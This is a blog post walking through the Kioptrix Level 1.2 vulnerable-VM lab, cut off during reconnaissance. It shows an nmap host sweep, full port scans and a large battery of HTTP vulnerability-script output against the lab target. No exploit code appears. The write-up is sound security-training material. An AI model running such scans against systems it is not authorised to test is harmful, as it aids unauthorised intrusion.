b'\n<head>\n    <meta charset="utf-8">\n    <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">\n\n    <title>Kioptrix: Level 1.2 (#3) Walkthrough</title>\n\n    <link rel="canonical" href="../index.html">\n    <meta name="referrer" content="no-referrer-when-downgrade">\n    \n    <meta property="og:site_name" content="rootshellz">\n    <meta property="og:type" content="article">\n    <meta property="og:title" content="Kioptrix: Level 1.2 (#3) Walkthrough">\n    <meta property="og:description" content="Intro Today I will be continuing on the the Kioptrix series of vulnerable VMs.  In previous posts, I covered Kioptrix1 and Kioptrix1.1.  Per the author of the challenge, &amp;quot;The same as the others, there\xe2\x80\x99s more then one way to \xe2\x80\x9cpwn\xe2\x80\x9d this one. There\xe2\x80\x99s easy and not">\n    <meta property="og:url" content="http://localhost:3001/kioptrix-walkthrough-3/">\n    <meta property="og:image" content="http://localhost:3001/content/images/2018/07/Kioptrix-3-Cover.jpeg">\n    <meta property="article:published_time" content="2017-09-12T04:49:33.000Z">\n    <meta property="article:modified_time" content="2018-07-30T08:07:38.000Z">\n    <meta property="article:tag" content="Boot2Root">\n    <meta property="article:tag" content="VulnHub">\n    <meta property="article:tag" content="OSCP">\n    <meta property="article:tag" content="Kioptrix">\n    \n    <meta name="twitter:card" content="summary_large_image">\n    <meta name="twitter:title" content="Kioptrix: Level 1.2 (#3) Walkthrough">\n    <meta name="twitter:description" content="Intro Today I will be continuing on the the Kioptrix series of vulnerable VMs.  In previous posts, I covered Kioptrix1 and Kioptrix1.1.  Per the author of the challenge, &amp;quot;The same as the others, there\xe2\x80\x99s more then one way to \xe2\x80\x9cpwn\xe2\x80\x9d this one. There\xe2\x80\x99s easy and not">\n    <meta name="twitter:url" content="http://localhost:3001/kioptrix-walkthrough-3/">\n    <meta name="twitter:image" content="http://localhost:3001/content/images/2018/07/Kioptrix-3-Cover.jpeg">\n    <meta name="twitter:label1" content="Written by">\n    <meta name="twitter:data1" content="rootshellz">\n    <meta name="twitter:label2" content="Filed under">\n    <meta name="twitter:data2" content="Boot2Root, VulnHub, OSCP, Kioptrix">\n    <meta name="twitter:site" content="@rootshellz">\n    <meta name="twitter:creator" content="@rootshellz">\n    <meta property="og:image:width" content="648">\n    <meta property="og:image:height" content="348">\n    \n    <script type="application/ld+json">\n{\n    "@context": "https://schema.org",\n    "@type": "Article",\n    "publisher": {\n        "@type": "Organization",\n        "name": "rootshellz",\n        "url": "http://localhost:3001/",\n        "logo": {\n            "@type": "ImageObject",\n            "url": "http://localhost:3001/content/images/2018/07/Blog-Logo.png"\n        }\n    },\n    "author": {\n        "@type": "Person",\n        "name": "rootshellz",\n        "image": {\n            "@type": "ImageObject",\n            "url": "http://localhost:3001/content/images/2018/07/rootshellz.jpg",\n            "width": 1630,\n            "height": 1631\n        },\n        "url": "http://localhost:3001/author/rootshellz/",\n        "sameAs": [\n            "https://twitter.com/rootshellz"\n        ]\n    },\n    "headline": "Kioptrix: Level 1.2 (#3) Walkthrough",\n    "url": "http://localhost:3001/kioptrix-walkthrough-3/",\n    "datePublished": "2017-09-12T04:49:33.000Z",\n    "dateModified": "2018-07-30T08:07:38.000Z",\n    "image": {\n        "@type": "ImageObject",\n        "url": "http://localhost:3001/content/images/2018/07/Kioptrix-3-Cover.jpeg",\n        "width": 648,\n        "height": 348\n    },\n    "keywords": "Boot2Root, VulnHub, OSCP, Kioptrix",\n    "description": "Intro\\nToday I will be continuing on the the Kioptrix series\\n[http://www.kioptrix.com/blog/test-page/]  of vulnerable VMs. In previous posts,\\nI covered Kioptrix1 [https://blog.rootshellz.com/kioptrix-walkthrough-1/]  and \\nKioptrix1.1 [https://blog.rootshellz.com/kioptrix-walkthrough-2/].\\n\\nPer the author of the challenge, &quot;The same as the others, there\xe2\x80\x99s more then one\\nway to \xe2\x80\x9cpwn\xe2\x80\x9d this one. There\xe2\x80\x99s easy and not so easy.&quot; So let&#x27;s see if we can\\nfind both, shall we?\\n\\nSetup\\nThe challenge description ",\n    "mainEntityOfPage": {\n        "@type": "WebPage",\n        "@id": "http://localhost:3001/"\n    }\n}\n    </script>\n\n    <meta name="generator" content="Ghost 3.36">\n    <link rel="alternate" type="application/rss+xml" title="rootshellz" href="../../rss/index.html">\n\n    <style amp-custom>\n    *,\n    *::before,\n    *::after {\n        box-sizing: border-box;\n    }\n\n    html {\n        overflow-x: hidden;\n        overflow-y: scroll;\n        font-size: 62.5%;\n        -webkit-tap-highlight-color: rgba(0, 0, 0, 0);\n    }\n\n    body {\n        min-height: 100vh;\n        margin: 0;\n        padding: 0;\n        color: #3a4145;\n        font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;\n        font-size: 1.7rem;\n        line-height: 1.55em;\n        font-weight: 400;\n        font-style: normal;\n        background: #fff;\n        scroll-behavior: smooth;\n        overflow-x: hidden;\n        -webkit-font-smoothing: antialiased;\n        -moz-osx-font-smoothing: grayscale;\n    }\n\n    p,\n    ul,\n    ol,\n    li,\n    dl,\n    dd,\n    hr,\n    pre,\n    form,\n    table,\n    video,\n    figure,\n    figcaption,\n    blockquote {\n        margin: 0;\n        padding: 0;\n    }\n\n    ul[class],\n    ol[class] {\n        padding: 0;\n        list-style: none;\n    }\n\n    img {\n        display: block;\n        max-width: 100%;\n    }\n\n    input,\n    button,\n    select,\n    textarea {\n        font: inherit;\n        -webkit-appearance: none;\n    }\n\n    fieldset {\n        margin: 0;\n        padding: 0;\n        border: 0;\n    }\n\n    label {\n        display: block;\n        font-size: 0.9em;\n        font-weight: 700;\n    }\n\n    hr {\n        position: relative;\n        display: block;\n        width: 100%;\n        height: 1px;\n        border: 0;\n        border-top: 1px solid currentcolor;\n        opacity: 0.1;\n    }\n\n    ::selection {\n        text-shadow: none;\n        background: #cbeafb;\n    }\n\n    mark {\n        background-color: #fdffb6;\n    }\n\n    small {\n        font-size: 80%;\n    }\n\n    sub,\n    sup {\n        position: relative;\n        font-size: 75%;\n        line-height: 0;\n        vertical-align: baseline;\n    }\n    sup {\n        top: -0.5em;\n    }\n    sub {\n        bottom: -0.25em;\n    }\n\n    ul li + li {\n        margin-top: 0.6em;\n    }\n\n    a {\n        color: #1292EE;\n        text-decoration-skip-ink: auto;\n    }\n\n    h1,\n    h2,\n    h3,\n    h4,\n    h5,\n    h6 {\n        margin: 0;\n        font-weight: 700;\n        color: #121212;\n        line-height: 1.4em;\n    }\n\n    h1 {\n        font-size: 3.4rem;\n        line-height: 1.1em;\n    }\n\n    h2 {\n        font-size: 2.4rem;\n        line-height: 1.2em;\n    }\n\n    h3 {\n        font-size: 1.8rem;\n    }\n\n    h4 {\n        font-size: 1.7rem;\n    }\n\n    h5 {\n        font-size: 1.6rem;\n    }\n\n    h6 {\n        font-size: 1.6rem;\n    }\n\n    amp-img {\n        height: 100%;\n        width: 100%;\n        max-width: 100%;\n        max-height: 100%;\n    }\n\n    amp-img img {\n        object-fit: cover;\n    }\n\n    .page-header {\n        padding: 50px 5vmin 30px;\n        text-align: center;\n        font-size: 2rem;\n        text-transform: uppercase;\n        letter-spacing: 0.5px;\n    }\n\n    .page-header a {\n        color: #121212;\n        font-weight: 700;\n        text-decoration: none;\n        font-size: 1.6rem;\n        letter-spacing: -0.1px;\n    }\n\n    .post {\n        max-width: 680px;\n        margin: 0 auto;\n    }\n\n    .post-header {\n        margin: 0 5vmin 5vmin;\n        text-align: center;\n    }\n\n    .post-meta {\n        margin: 1rem 0 0 0;\n        text-transform: uppercase;\n        color: #738a94;\n        font-weight: 500;\n        font-size: 1.3rem;\n    }\n\n    .post-image {\n        margin: 0 0 5vmin;\n    }\n\n    .post-image img {\n        display: block;\n        width: 100%;\n        height: auto;\n    }\n\n    .post-content {\n        padding: 0 5vmin;\n    }\n\n    .post-content > * + * {\n        margin-top: 1.5em;\n    }\n\n    .post-content [id]:not(:first-child) {\n        margin: 2em 0 0;\n    }\n\n    .post-content > [id] + * {\n        margin-top: 1rem;\n    }\n\n    .post-content [id] + .kg-card,\n    .post-content blockquote + .kg-card {\n        margin-top: 40px;\n    }\n\n    .post-content > ul,\n    .post-content > ol,\n    .post-content > dl {\n        padding-left: 1.9em;\n    }\n\n    .post-content hr {\n        margin-top: 40px;\n    }\n\n    .post .post-content hr + * {\n        margin-top: 40px;\n    }\n\n    .post-content amp-img {\n        background-color: #f8f8f8;\n    }\n\n    .post-content blockquote {\n        position: relative;\n        font-style: italic;\n    }\n\n    .post-content blockquote::before {\n        content: "";\n        position: absolute;\n        left: -1.5em;\n        top: 0;\n        bottom: 0;\n        width: 0.3rem;\n        background: #000;\n    }\n\n    .post-content :not(.kg-card):not([id]) + .kg-card {\n        margin-top: 40px;\n    }\n\n    .post-content .kg-card + :not(.kg-card) {\n        margin-top: 40px;\n    }\n\n    .kg-card figcaption {\n        padding: 1.5rem 1.5rem 0;\n        text-align: center;\n        font-weight: 500;\n        font-size: 1.3rem;\n        line-height: 1.4em;\n        opacity: 0.6;\n    }\n\n    .kg-card figcaption strong {\n        color: rgba(0,0,0,0.8);\n    }\n\n    .post-content :not(pre) code {\n        vertical-align: middle;\n        padding: 0.15em 0.4em 0.15em;\n        border: #e1eaef 1px solid;\n        font-weight: 400;\n        font-size: 0.9em;\n        line-height: 1em;\n        color: #dc0050;\n        background: #f0f6f9;\n        border-radius: 0.25em;\n    }\n\n    .post-content > pre {\n        overflow: scroll;\n        padding: 16px 20px;\n        color: #fff;\n        background: #1F2428;\n        border-radius: 5px;\n        box-shadow: 0 2px 6px -2px rgba(0,0,0,.1), 0 0 1px rgba(0,0,0,.4);\n    }\n\n    .kg-embed-card {\n        display: flex;\n        flex-direction: column;\n        align-items: center;\n        width: 100%;\n    }\n\n    .kg-image-card img {\n        margin: auto;\n    }\n\n    .kg-gallery-card + .kg-gallery-card {\n        margin-top: 0.75em;\n    }\n\n    .kg-gallery-container {\n        position: relative;\n    }\n\n    .kg-gallery-row {\n        display: flex;\n        flex-direction: row;\n        justify-content: center;\n    }\n\n    .kg-gallery-image {\n        width: 100%;\n        height: 100%;\n    }\n\n    .kg-gallery-row:not(:first-of-type) {\n        margin: 0.75em 0 0 0;\n    }\n\n    .kg-gallery-image:not(:first-of-type) {\n        margin: 0 0 0 0.75em;\n    }\n\n    .kg-bookmark-card,\n    .kg-bookmark-publisher {\n        position: relative;\n    }\n\n    .kg-bookmark-container,\n    .kg-bookmark-container:hover {\n        display: flex;\n        flex-wrap: wrap;\n        flex-direction: row-reverse;\n        color: currentColor;\n        background: rgba(255,255,255,0.6);\n        font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;\n        text-decoration: none;\n        border-radius: 5px;\n        box-shadow: 0 2px 6px -2px rgba(0, 0, 0, 0.1), 0 0 1px rgba(0, 0, 0, 0.4);\n        overflow: hidden;\n    }\n\n    .kg-bookmark-content {\n        flex-basis: 0;\n        flex-grow: 999;\n        padding: 20px;\n        order: 1;\n    }\n\n    .kg-bookmark-title {\n        font-weight: 600;\n        font-size: 1.5rem;\n        line-height: 1.3em;\n    }\n\n    .kg-bookmark-description {\n        display: -webkit-box;\n        max-height: 45px;\n        margin: 0.5em 0 0 0;\n        font-size: 1.4rem;\n        line-height: 1.55em;\n        overflow: hidden;\n        opacity: 0.8;\n        -webkit-line-clamp: 2;\n        -webkit-box-orient: vertical;\n    }\n\n    .kg-bookmark-metadata {\n        margin-top: 20px;\n    }\n\n    .kg-bookmark-metadata {\n        display: flex;\n        align-items: center;\n        font-weight: 500;\n        font-size: 1.3rem;\n        line-height: 1.3em;\n        white-space: nowrap;\n        overflow: hidden;\n        text-overflow: ellipsis;\n    }\n\n    .kg-bookmark-description {\n        display: -webkit-box;\n        -webkit-box-orient: vertical;\n        -webkit-line-clamp: 2;\n        overflow: hidden;\n    }\n\n    .kg-bookmark-metadata amp-img {\n        width: 18px;\n        height: 18px;\n        max-width: 18px;\n        max-height: 18px;\n        margin-right: 10px;\n    }\n\n    .kg-bookmark-thumbnail {\n        display: flex;\n        flex-basis: 20rem;\n        flex-grow: 1;\n        justify-content: flex-end;\n    }\n\n    .kg-bookmark-thumbnail amp-img {\n        max-height: 200px;\n    }\n\n    .kg-bookmark-author {\n        white-space: nowrap;\n        text-overflow: ellipsis;\n        overflow: hidden;\n    }\n\n    .kg-bookmark-publisher::before {\n        content: "\xe2\x80\xa2";\n        margin: 0 .5em;\n    }\n\n    .kg-width-full.kg-card-hascaption {\n        display: grid;\n        grid-template-columns: inherit;\n    }\n\n    .post-content table {\n        border-collapse: collapse;\n        width: 100%;\n    }\n\n    .post-content th {\n        padding: 0.5em 0.8em;\n        text-align: left;\n        font-size: .75em;\n        text-transform: uppercase;\n    }\n\n    .post-content td {\n        padding: 0.4em 0.7em;\n    }\n\n    .post-content tbody tr:nth-child(2n + 1) {\n        background-color: rgba(0,0,0,0.1);\n        padding: 1px;\n    }\n\n    .post-content tbody tr:nth-child(2n + 2) td:last-child {\n        box-shadow:\n            inset 1px 0 rgba(0,0,0,0.1),\n            inset -1px 0 rgba(0,0,0,0.1);\n    }\n\n    .post-content tbody tr:nth-child(2n + 2) td {\n        box-shadow: inset 1px 0 rgba(0,0,0,0.1);\n    }\n\n    .post-content tbody tr:last-child {\n        border-bottom: 1px solid rgba(0,0,0,.1);\n    }\n\n    .page-footer {\n        padding: 60px 5vmin;\n        margin: 60px auto 0;\n        text-align: center;\n        background-color: #f8f8f8;\n    }\n\n    .page-footer h3 {\n        margin: 0.5rem 0 0 0;\n    }\n\n    .page-footer p {\n        max-width: 500px;\n        margin: 1rem auto 1.5rem;\n        font-size: 1.7rem;\n        line-height: 1.5em;\n        color: rgba(0,0,0,0.6)\n    }\n\n    .powered {\n        display: inline-flex;\n        align-items: center;\n        margin: 30px 0 0;\n        padding: 6px 9px 6px 6px;\n        border: rgba(0,0,0,0.1) 1px solid;\n        font-size: 12px;\n        line-height: 12px;\n        letter-spacing: -0.2px;\n        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Oxygen", "Ubuntu", "Cantarell", "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;\n        font-weight: 500;\n        color: #222;\n        text-decoration: none;\n        background: #fff;\n        border-radius: 6px;\n    }\n\n    .powered svg {\n        height: 16px;\n        width: 16px;\n        margin: 0 6px 0 0;\n    }\n\n    @media (max-width: 600px) {\n        body {\n            font-size: 1.6rem;\n        }\n        h1 {\n            font-size: 3rem;\n        }\n\n        h2 {\n            font-size: 2.2rem;\n        }\n    }\n\n    @media (max-width: 400px) {\n        h1 {\n            font-size: 2.6rem;\n            line-height: 1.15em;\n        }\n        h2 {\n            font-size: 2rem;\n            line-height: 1.2em;\n        }\n        h3 {\n            font-size: 1.7rem;\n        }\n    }\n    </style>\n\n    <style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>\n    <script async src="https://cdn.ampproject.org/v0.js"></script>\n\n    \n\n</head>\n\n<body class="amp-template">\n    <header class="page-header">\n        <a href="../../">\n                rootshellz\n        </a>\n    </header>\n\n    <main class="content" role="main">\n        <article class="post">\n\n            <header class="post-header">\n                <h1 class="post-title">Kioptrix: Level 1.2 (#3) Walkthrough</h1>\n                <section class="post-meta">\n                    rootshellz -\n                    <time class="post-date" datetime="2017-09-11">11 Sep 2017</time>\n                </section>\n            </header>\n            <figure class="post-image">\n                <amp-img src="http://localhost:3001/content/images/2018/07/Kioptrix-3-Cover.jpeg" width="600" height="340" layout="responsive"></amp-img>\n            </figure>\n            <section class="post-content">\n\n                <h1 id="intro">Intro</h1>\n<p>Today I will be continuing on the the <a href="http://www.kioptrix.com/blog/test-page/">Kioptrix series</a> of vulnerable VMs.  In previous posts, I covered <a href="https://blog.rootshellz.com/kioptrix-walkthrough-1/">Kioptrix1</a> and <a href="https://blog.rootshellz.com/kioptrix-walkthrough-2/">Kioptrix1.1</a>.</p>\n<p>Per the author of the challenge, "The same as the others, there\xe2\x80\x99s more then one way to \xe2\x80\x9cpwn\xe2\x80\x9d this one. There\xe2\x80\x99s easy and not so easy."  So let\'s see if we can find both, shall we?</p>\n<h1 id="setup">Setup</h1>\n<p>The challenge description and Readme file tells us that in addition to spinning up the VM and letting DHCP assign it an address, we also need to point <strong>kioptrix3.com</strong> to the VM\'s IP.  The Readme also confirms this is another web challenge, which makes sense given the required name mapping.  Let\'s spin up the VM, find it on the network, and then point the domain name via our Kali attack box\'s hosts file.</p>\n<p>We use an nmap Ping scan of our local subnet to identify the target.</p>\n<pre><code class="language-shell-output">root@kali:~# nmap -T4 -sn 172.16.2.0/24\n\nStarting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-08-30 23:01 PDT\nNmap scan report for 172.16.2.1\nHost is up (0.00013s latency).\nMAC Address: 00:50:56:C0:00:02 (VMware)\nNmap scan report for 172.16.2.132\nHost is up (0.00015s latency).\nMAC Address: 00:0C:29:0A:F9:22 (VMware)\nNmap scan report for 172.16.2.254\nHost is up (0.00013s latency).\nMAC Address: 00:50:56:F5:96:F6 (VMware)\nNmap scan report for 172.16.2.129\nHost is up.\nNmap done: 256 IP addresses (4 hosts up) scanned in 12.86 seconds\n</code></pre>\n<p>Process of elimination of the know addresses means 172.16.2.132 is our target.</p>\n<p>Per the Readme, let\'s point kioptrix3.com to 172.16.2.132:</p>\n<pre><code class="language-shell-output">root@kali:~# echo "172.16.2.132  kioptrix3.com" &gt;&gt; /etc/hosts\n</code></pre>\n<h1 id="initialscanningandenumeration">Initial Scanning and Enumeration</h1>\n<p>With out target identified and name resolution set up, let\'s move on to initial scanning of the VM.</p>\n<p>TCP scanning:</p>\n<pre><code class="language-shell-output">root@kali:~# nmap -T4 -Pn -sV -O -p- kioptrix3.com\n\nStarting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-08-30 23:08 PDT\nNmap scan report for kioptrix3.com (172.16.2.132)\nHost is up (0.00045s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)\n80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)\nMAC Address: 00:0C:29:0A:F9:22 (VMware)\nDevice type: general purpose\nRunning: Linux 2.6.X\nOS CPE: cpe:/o:linux:linux_kernel:2.6\nOS details: Linux 2.6.9 - 2.6.33\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 9.10 seconds\n</code></pre>\n<p>UDP scanning:</p>\n<pre><code class="language-shell-output">root@kali:~# nmap -T4 -Pn -sU --top-ports 200 -sV -O 172.16.2.132\n\nStarting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-08-30 23:09 PDT\nNmap scan report for kioptrix3.com (172.16.2.132)\nHost is up (0.00044s latency).\nAll 200 scanned ports on kioptrix3.com (172.16.2.132) are closed (154) or open|filtered (46)\nMAC Address: 00:0C:29:0A:F9:22 (VMware)\nToo many fingerprints match this host to give specific OS details\nNetwork Distance: 1 hop\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 307.11 seconds\n</code></pre>\n<p>Not much to work with, but at least we know where to focus our effort.</p>\n<p>Deeper Apache enumeration with relevant nmap scripts:</p>\n<pre><code class="language-shell-output">root@kali:~# nmap -T4 -Pn -p 80 --script=http-apache-negotiation.nse,http-apache-server-status.nse,http-backup-finder.nse,http-coldfusion-subzero.nse,http-comments-displayer.nse,http-config-backup.nse,http-csrf.nse,http-default-accounts.nse,http-devframework.nse,http-dombased-xss.nse,http-drupal-enum.nse,http-drupal-enum-users.nse,http-enum.nse,http-git.nse,http-headers.nse,http-iis-short-name-brute.nse,http-iis-webdav-vuln.nse,http-mcmp.nse,http-methods.nse,http-method-tamper.nse,http-mobileversion-checker.nse,http-open-proxy.nse,http-open-redirect.nse,http-passwd.nse,http-phpmyadmin-dir-traversal.nse,http-phpself-xss.nse,http-php-version.nse,http-proxy-brute.nse,http-robots.txt.nse,http-shellshock.nse,http-sitemap-generator.nse,http-sql-injection.nse,http-stored-xss.nse,http-title.nse,http-unsafe-output-escaping.nse,http-userdir-enum.nse,http-vhosts.nse,http-vuln-cve2006-3392.nse,http-vuln-cve2009-3960.nse,http-vuln-cve2010-0738.nse,http-vuln-cve2010-2861.nse,http-vuln-cve2011-3192.nse,http-vuln-cve2011-3368.nse,http-vuln-cve2012-1823.nse,http-vuln-cve2013-0156.nse,http-vuln-cve2013-6786.nse,http-vuln-cve2013-7091.nse,http-vuln-cve2014-2126.nse,http-vuln-cve2014-2127.nse,http-vuln-cve2014-2128.nse,http-vuln-cve2014-2129.nse,http-vuln-cve2014-3704.nse,http-vuln-cve2014-8877.nse,http-vuln-cve2015-1427.nse,http-vuln-cve2015-1635.nse,http-waf-detect.nse,http-waf-fingerprint.nse,http-webdav-scan.nse,http-wordpress-enum.nse,http-wordpress-users.nse,http-xssed.nse,membase-http-info.nse,rmi-vuln-classloader.nse 172.16.2.132\n\nStarting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-08-30 23:20 PDT\nNmap scan report for kioptrix3.com (172.16.2.132)\nHost is up (0.00034s latency).\nPORT   STATE SERVICE\n80/tcp open  http\n| http-comments-displayer: \n| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=kioptrix3.com\n|     \n|     Path: http://kioptrix3.com/index.php?system=Admin\n|     Line number: 12\n|     Comment: \n|         &lt;!--\n|           $(document).ready(function() {\n|               // Handler for .ready() called.\n|               $(\'body\').corner();\n|               $(\'#footer\').corner();\n|               $(\'#menu\').corner("right");\n|           });\n|           --&gt;\n|     \n|     Path: http://kioptrix3.com/gallery/index.php\n|     Line number: 72\n|     Comment: \n|         &lt;!-- gallery_stats: outputs statistics for the photo gallery --&gt;\n|     \n|     Path: http://kioptrix3.com/index.php?system=Blog&amp;post=1281005380\n|     Line number: 27\n|     Comment: \n|         &lt;!-- BEGIN --&gt;\n|     \n|     Path: http://kioptrix3.com/gallery/index.php\n|     Line number: 54\n|     Comment: \n|         &lt;!-- links_end --&gt;\n|     \n|     Path: http://kioptrix3.com/gallery/index.php\n|     Line number: 70\n|     Comment: \n|         &lt;!-- popular_grid: output a 4x1 row containing the most viewed photos --&gt;\n|     \n|     Path: http://kioptrix3.com/gallery/index.php\n|     Line number: 23\n|     Comment: \n|         &lt;!-- menu: output the generic gallery navigation menu --&gt;\n|     \n|     Path: http://kioptrix3.com/index.php?system=Blog&amp;post=1281005380\n|     Line number: 58\n|     Comment: \n|         &lt;!--\n|         var formAction = {\n|           remember : function() {\n|             if (document.getElementById("remember").checked) {\n|               var expire = new Date();\n|               expire.setTime(expire.getTime() + 30*24*60*60*1000);\n|               var inputs = document.getElementById("commentForm").getElementsByTagName("input");\n|               var name;\n|               var website;\n|               for (var i=0; i&lt;inputs.length; i++) {\n|                 if (inputs[i].name=="name") name = inputs[i].value;\n|                 else if (inputs[i].name=="website") website = inputs[i].value;\n|               }\n|               document.cookie = "newsguest=" + name + "," + website + "; expires=" + expire.toGMTString();\n|             }\n|           },\n|           fill : function() {\n|             var cookie = document.cookie;\n|             var newsguest = "newsguest=";\n|             var begin = cookie.indexOf(newsguest);\n|             if (begin&gt;-1) {\n|               begin += newsguest.length;\n|               var end = cookie.indexOf(";", begin);\n|               if (end==-1) end = cookie.length;\n|               var guests = cookie.substring(begin, end).split(",");\n|               var inputs = document.getElementById("commentForm").getElementsByTagName("input");\n|               for (var i=0; i&lt;inputs.length; i++) {\n|                 if (inputs[i].name=="name") inputs[i].value = guests[0];\n|                 else if (inputs[i].name=="website") inputs[i].value = guests[1];\n|               }\n|             }\n|           },\n|           validate : function() {\n|             var inputs = document.getElementById("commentForm").getElementsByTagName("input");\n|             for (var i=0; i&lt;inputs.length; i++) {\n|               if (inputs[i].name=="name" &amp;&amp; inputs[i].value==\'\') return false;\n|             }\n|             return (document.getElementById("commentForm").getElementsByTagName("textarea")[0].value!=\'\');\n|           },\n|           submit : function() {\n|             if (this.validate()) {\n|               this.remember();\n|               return true;\n|             } else {\n|               alert(\'No blank name or message, please.\');\n|               return false;\n|             }\n|           }\n|         };\n|         window.onload = formAction.fill;\n|         //--&gt;\n|     \n|     Path: http://kioptrix3.com/index.php?system=Blog&amp;post=1281005380\n|     Line number: 112\n|     Comment: \n|         &lt;!-- Leaving in my name and website link will be greatly appreciated in return for offering you this template for free. Thanking you in advance. --&gt;\n|     \n|     Path: http://kioptrix3.com/gallery/index.php\n|     Line number: 48\n|     Comment: \n|         &lt;!--  &lt;a href="gadmin"&gt;Admin&lt;/a&gt;&amp;nbsp;&amp;nbsp; --&gt;\n|     \n|     Path: http://kioptrix3.com/gallery/g.php/1\n|     Line number: 47\n|     Comment: \n|         &lt;!-- gallery_photo_grid: output 4x1 rows containing photos in this gallery --&gt;\n|     \n|     Path: http://kioptrix3.com/index.php?system=Blog&amp;post=1281005380\n|     Line number: 108\n|     Comment: \n|         \n|         //--&gt;&lt;/script&gt;        &lt;/div&gt;\n|     \n|     Path: http://kioptrix3.com/gallery/themes/black/style.css\n|     Line number: 1\n|     Comment: \n|         /*  \n|         Theme Name: Gallarific Black\n|         Theme URI: http://www.gallarific.com/\n|         Description: The Gallarific black photo gallery theme\n|         Version: 1.0\n|         Author: Gallarific\n|         Author URI: http://www.gallarific.com/\n|         */\n|     \n|     Path: http://kioptrix3.com/gallery/g.php/1\n|     Line number: 47\n|     Comment: \n|         &lt;!-- gallery_photo_grid_end --&gt;\n|     \n|     Path: http://kioptrix3.com/gallery/index.php\n|     Line number: 101\n|     Comment: \n|         &lt;!-- gallery_stats_end --&gt;\n|     \n|     Path: http://kioptrix3.com/gallery/index.php\n|     Line number: 55\n|     Comment: \n|         &lt;!-- recent_grid: output a 4x1 row containing recently uploaded photos --&gt;\n|     \n|     Path: http://kioptrix3.com/index.php?system=Blog&amp;post=1281005380\n|     Line number: 29\n|     Comment: \n|         &lt;!-- END --&gt;\n|     \n|     Path: http://kioptrix3.com/gallery/index.php\n|     Line number: 38\n|     Comment: \n|         &lt;!-- menu_end --&gt;\n|     \n|     Path: http://kioptrix3.com/gallery/index.php\n|     Line number: 55\n|     Comment: \n|         &lt;!-- recent_grid_end --&gt;\n|     \n|     Path: http://kioptrix3.com/gallery/index.php\n|     Line number: 70\n|     Comment: \n|         &lt;!-- popular_grid_end --&gt;\n|     \n|     Path: http://kioptrix3.com/gallery/index.php\n|     Line number: 39\n|     Comment: \n|_        &lt;!-- links: output quick links for gallery --&gt;\n| http-csrf: \n| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=kioptrix3.com\n|   Found the following possible CSRF vulnerabilities: \n|     \n|     Path: http://kioptrix3.com/gallery/\n|     Form id: \n|     Form action: login.php\n|     \n|     Path: http://kioptrix3.com/index.php?system=Admin\n|     Form id: contactform\n|     Form action: index.php?system=Admin&amp;page=loginSubmit\n|     \n|     Path: http://kioptrix3.com/gallery/\n|     Form id: \n|     Form action: login.php\n|     \n|     Path: http://kioptrix3.com/gallery/gadmin/\n|     Form id: username\n|     Form action: index.php?task=signin\n|     \n|     Path: http://kioptrix3.com/gallery/index.php\n|     Form id: \n|     Form action: login.php\n|     \n|     Path: http://kioptrix3.com/index.php?system=Blog&amp;post=1281005380#comments\n|     Form id: commentform\n|     Form action: \n|     \n|     Path: http://kioptrix3.com/index.php?system=Blog&amp;post=1281005380\n|     Form id: commentform\n|_    Form action: \n|_http-devframework: Couldn\'t determine the underlying framework or CMS. Try increasing \'httpspider.maxpagecount\' value to spider more pages.\n|_http-dombased-xss: Couldn\'t find any DOM based XSS.\n| http-enum: \n|   /phpmyadmin/: phpMyAdmin\n|   /cache/: Potentially interesting folder\n|   /core/: Potentially interesting folder\n|   /icons/: Potentially interesting folder w/ directory listing\n|   /modules/: Potentially interesting directory w/ listing on \'apache/2.2.8 (ubuntu) php/5.2.4-2ubuntu5.6 with suhosin-patch\'\n|_  /style/: Potentially interesting folder\n| http-headers: \n|   Date: Wed, 30 Aug 2017 23:20:14 GMT\n|   Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch\n|   X-Powered-By: PHP/5.2.4-2ubuntu5.6\n|   Set-Cookie: PHPSESSID=c148ca51a0a449b611c4c46c62b9ddfe; path=/\n|   Expires: Thu, 19 Nov 1981 08:52:00 GMT\n|   Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\n|   Pragma: no-cache\n|   Connection: close\n|   Content-Type: text/html\n|   \n|_  (Request type: HEAD)\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-mobileversion-checker: No mobile version detected.\n| http-php-version: Versions from logo query (less accurate): 5.1.3 - 5.1.6, 5.2.0 - 5.2.17\n| Versions from credits query (more accurate): 5.2.3 - 5.2.5, 5.2.6RC3\n|_Version from header 